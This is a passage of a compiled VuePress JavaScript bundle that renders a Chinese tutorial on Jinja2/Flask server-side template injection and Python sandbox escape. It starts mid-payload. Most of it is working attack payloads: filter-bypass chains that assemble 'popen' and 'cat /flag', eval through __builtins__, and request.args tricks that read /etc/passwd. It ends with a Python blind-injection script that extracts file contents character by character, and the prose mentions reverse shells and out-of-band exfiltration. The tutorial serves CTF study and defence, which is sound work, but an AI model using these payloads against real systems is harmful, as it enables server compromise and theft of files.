((app.__doc__|list()).pop(337)|string)%}\n{% set lb = ((app.__doc__|list()).pop(264)|string)%}\n{% set rb = ((app.__doc__|list()).pop(286)|string)%}\n{% set slas = (eki.__init__.__globals__.__repr__()|list()).pop(349)%}\n{% set bu = dict(buil=x,tins=xx)|join %}\n{% set im = dict(imp=x,ort=xx)|join %}\n{% set sy = dict(po=x,pen=xx)|join %}\n{% set oms = dict(o=x,s=xx)|join %}\n{% set fl4g = dict(f=x,lag=xx)|join %}\n{% set ca = dict(ca=x,t=xx)|join %}\n{% set ev = dict(ev=x,al=xx)|join %}\n{% set red = dict(re=x,ad=xx)|join%}\n{% set bul = xhx*2~bu~xhx*2 %}\n\n{% set payload = xhx*2~im~xhx*2~lb~quote~oms~quote~rb~pt~sy~lb~quote~ca~sp~slas~fl4g~quote~rb~pt~red~lb~rb %}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br")])]),a("p",[s._v("可以在"),a("code",[s._v("eval")]),s._v("或"),a("code",[s._v("exec")]),s._v("语句中使用，如下")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{% for f,v in eki.__init__.__globals__.items() %} \n    {% if f == bul %} \n        {% for a,b in v.items() %}\n            {% set x=a%}\n            {% if a == ev %}\n                {{b(payload)}}\n            {% endif %}\n        {% endfor %}\n    {% endif %}\n{% endfor %}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br")])]),a("p",[a("strong",[s._v("Python3 对Unicode的Normal化")])]),s._v(" "),a("p",[s._v("比如")]),s._v(" "),a("p",[a("a",{attrs:{href:"https://p5.ssl.qhimg.com/t01e6ff8bff9d312746.png",target:"_blank",rel:"noopener noreferrer"}},[a("img",{attrs:{src:"54.ssrf.assets/t01e6ff8bff9d312746.png",alt:"img"}}),a("OutboundLink")],1)]),s._v(" "),a("p",[s._v("可以绕过数字限制")]),s._v(" "),a("p",[s._v("同时在python3中会对unicode normalize，导致exec可以执行unicode代码")]),s._v(" "),a("p",[a("a",{attrs:{href:"https://p1.ssl.qhimg.com/t01bdad70a59749d7dd.png",target:"_blank",rel:"noopener noreferrer"}},[a("img",{attrs:{src:"54.ssrf.assets/t01bdad70a59749d7dd.png",alt:"img"}}),a("OutboundLink")],1)]),s._v(" "),a("p",[a("strong",[s._v("Python的格式化字符串特性")])]),s._v(" "),a("p",[s._v("比如")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("'{0:c}'['format'](95)\n{ \"%s, %s!\"|format(greeting, name) }}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("拼接起来有")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{{\"\"['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](99)+'{0:c}'['format'](108)+'{0:c}'['format'](97)+'{0:c}'['format'](115)+'{0:c}'['format'](115)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]}}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("getlist")])]),s._v(" "),a("p",[s._v("使用"),a("code",[s._v(".getlist()")]),s._v("方法获得一个列表，这个列表的参数可以在后面传递")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{%print (request.args.getlist(request.args.l)|join)%}&l=a&a=_&a=_&a=class&a=_&a=_\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("可以获得"),a("code",[s._v("__class__")])]),s._v(" "),a("h3",{attrs:{id:"特殊字符过滤"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#特殊字符过滤"}},[s._v("#")]),s._v(" 特殊字符过滤")]),s._v(" "),a("p",[a("strong",[s._v("过滤引号")])]),s._v(" "),a("p",[a("code",[s._v("request.args")]),s._v(" 是flask中的一个属性,为返回请求的参数,这里把path当作变量名,将后面的路径传值进来,进而绕过了引号的过滤\n将其中的"),a("code",[s._v("request.args")]),s._v("改为"),a("code",[s._v("request.values")]),s._v("则利用"),a("code",[s._v("REQUEST")]),s._v("的方式进行传参")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("过滤双下划线")])]),s._v(" "),a("p",[s._v("同样利用"),a("code",[s._v("request.args")]),s._v("属性")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__\n#GET:\n{{ ''[request.value.class][request.value.mro][2][request.value.subclasses]()[40]('/etc/passwd').read() }}\n\n#POST:\nclass=__class__&mro=__mro__&subclasses=__subclasses__\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[a("strong",[s._v("过滤"),a("code",[s._v(".")]),s._v("/"),a("code",[s._v("[]")])])]),s._v(" "),a("p",[s._v("这里对获取元素方法属性进行了限制，那么我们可以使用上面Trick中介绍的获取对象元素的几种方式进行绕过")]),s._v(" "),a("p",[s._v("比如用原生JinJa2函数"),a("code",[s._v("|attr()")])]),s._v(" "),a("p",[s._v("将"),a("code",[s._v("request.__class__")]),s._v("改成"),a("code",[s._v('request|attr("__class__")')])]),s._v(" "),a("p",[a("strong",[s._v("同时绕过下划线、与中括号")])]),s._v(" "),a("p",[s._v("综合之前的Trick利用就行")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{{()|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|attr(request.values.name4)(40)('/etc/passwd')|attr(request.values.name5)()}}post:name1=__class__&name2=__base__&name3=__subclasses__&name4=pop&name5=read\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("过滤圆括号")])]),s._v(" "),a("ul",[a("li",[s._v("对函数执行方式进行重载,比如将\n"),a("code",[s._v("request.__class__.__getitem__=__builtins__.exec;")]),s._v("\n那么执行"),a("code",[s._v("request[payload]")]),s._v("时就相当于"),a("code",[s._v("exec(payload)")]),s._v("了")]),s._v(" "),a("li",[s._v("使用lambda表达式进行绕过")])]),s._v(" "),a("h3",{attrs:{id:"对象层面禁用"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#对象层面禁用"}},[s._v("#")]),s._v(" 对象层面禁用")]),s._v(" "),a("ul",[a("li",[a("code",[s._v("set {}=None")])])]),s._v(" "),a("p",[s._v("只能设置该对象为None，通过其他引用同样可以找到该对象")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{{% set config=None%}} -> {{url_for.__globals__.current_app.config}}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("ul",[a("li",[s._v("del")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("del __builtins__.__dict__['__import__']\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("通过"),a("code",[s._v("reload")]),s._v("进行重载")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("reload(__builtins__)\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("ul",[a("li",[s._v("其他一些小trick")])]),s._v(" "),a("p",[s._v("比如"),a("code",[s._v("func.__code__.co_consts")]),s._v(" 可以获得对应函数的上下文常量")]),s._v(" "),a("h2",{attrs:{id:"_0x04-盲注"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x04-盲注"}},[s._v("#")]),s._v(" 0x04 盲注")]),s._v(" "),a("p",[s._v("盲注一般有如下几种思路")]),s._v(" "),a("ul",[a("li",[s._v("反弹shell\n通过rce反弹一个shell出来绕过无回显的页面")]),s._v(" "),a("li",[s._v("带外注入\n通过requestbin或dnslog的方式将信息传到外界")]),s._v(" "),a("li",[s._v("纯盲注")])]),s._v(" "),a("p",[s._v("利用index方法")]),s._v(" "),a("blockquote",[a("p",[s._v("Python index() 方法检测字符串中是否包含子字符串 str ，如果指定 beg（开始） 和 end（结束） 范围，则检查是否包含在指定范围内，该方法与 python find()方法一样，只不过如果str不在 string中会报一个异常。")])]),s._v(" "),a("p",[s._v("比如")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{{(request.__class__.__mro__[2].__subclasses__[334].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()|string).index(\"r\",0,3)}}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("如果"),a("code",[s._v("/etc/passwd")]),s._v("的第一个字符是"),a("code",[s._v("r")]),s._v("那么就不会触发异常，如果不是就会触发异常，根据这个特点可以进行盲注")]),s._v(" "),a("p",[s._v("如下是一个盲注脚本")]),s._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" requests\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" string "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" printable "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("as")]),s._v(" pt\n\nhost "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"http://127.0.0.1:8765/"')]),s._v("\nres  "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("''")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" i "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("range")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("40")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" c "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" pt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        payload "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('\'{{(request.__class__.__mro__[2].__subclasses__[334].__init__.__globals__["__builtins__"]["file"]("/etc/passwd").read()|string).index("%c",%d,%d)}}\'')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("c"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("i"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("i"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" \n        param "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n            "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"name"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("payload\n        "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n        req "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" requests"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("get"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("host"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("params"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("param"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n        "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" req"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("status_code "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("200")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n            res "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+=")]),s._v(" c\n            "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("break")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("res"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br")])]),a("h2",{attrs:{id:"参考资料"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#参考资料"}},[s._v("#")]),s._v(" 参考资料")]),s._v(" "),a("p",[s._v("https://xz.aliyun.com/t/8029")]),s._v(" "),a("p",[s._v("https://blog.csdn.net/miuzzx/article/details/110220425")]),s._v(" "),a("p",[a("a",{attrs:{href:"https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#%E7%B1%BB%E7%BB%A7%E6%89%BF%E4%BD%BF%E7%94%A8",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#%E7%B1%BB%E7%BB%A7%E6%89%BF%E4%BD%BF%E7%94%A8"),a("OutboundLink")],1)]),s._v(" "),a("p",[a("a",{attrs:{href:"https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/"),a("OutboundLink")],1)])])}),[],!1,null,null,null);a.default=e.exports}}]);